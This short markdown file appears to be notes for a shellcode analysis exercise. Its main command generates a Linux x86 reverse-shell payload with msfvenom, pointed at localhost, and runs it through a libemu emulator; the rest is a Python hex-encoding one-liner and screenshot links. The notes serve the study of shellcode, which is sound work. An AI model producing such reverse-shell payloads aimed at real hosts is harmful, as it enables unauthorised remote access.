# Exercise 2


```
sh libemu.sh "msfvenom -p linux/x86/shell_reverse_tcp --platform=Linux -a x86 -f raw LPORT=8888 LHOST=127.0.0.1" bindshell | tee libemu_res/libemu_res.txt
```

Get Argc value: 	https://forum.nasm.us/index.php?topic=889.0

Python:
```
c[::-1].encode('hex')
```


![Screenshot](images/1.png)

![Screenshot](images/2.png)

![Screenshot](images/3.png)

![Screenshot](images/resd_problem/1.png)

![Screenshot](images/resd_problem/2.png)

![Screenshot](images/resd_problem/3.png)

![Screenshot](images/resd_problem/4.png)

![Screenshot](images/resd_problem/5.png)